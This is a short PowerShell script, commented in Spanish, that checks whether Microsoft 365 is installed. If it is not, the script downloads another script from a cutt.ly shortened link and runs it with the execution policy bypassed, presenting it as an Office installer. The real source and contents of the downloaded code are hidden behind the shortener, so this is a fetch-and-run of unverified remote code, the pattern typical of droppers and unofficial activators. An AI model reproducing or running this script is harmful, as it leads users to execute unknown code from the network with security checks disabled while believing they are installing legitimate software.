# Función para verificar si Microsoft 365 está instalado
function IsMicrosoft365Installed {
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
    $office365Key = Get-ChildItem $regPath | Where-Object { $_.GetValue("DisplayName") -like "*Microsoft 365*" }

    return $office365Key -ne $null
}

if (IsMicrosoft365Installed) {
    Write-Output "Microsoft 365 se encuentra instalado."
} else {
    Write-Output "Microsoft 365 no se encuentra instalado, procediendo con la instalación."

    try {
        Write-Host "Descargando e ejecutando el script de instalación de Office 365..."
        
        # Ruta del archivo temporal
        $scriptPath = "$env:TEMP\officeinstaller.ps1"

        # Descargar el script
        Invoke-WebRequest -Uri https://cutt.ly/0ecZESJt -OutFile $scriptPath

        # Verificar si el archivo se ha descargado correctamente
        if (Test-Path $scriptPath) {
            # Ejecutar el script
            Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Wait -NoNewWindow
            Write-Host "El script de instalación se ha ejecutado."
        } else {
            Write-Host "El archivo de script no se descargó correctamente."
        }
    } catch {
        Write-Host "Error al descargar o ejecutar el script."
        Write-Host $_.Exception.Message
    }
}
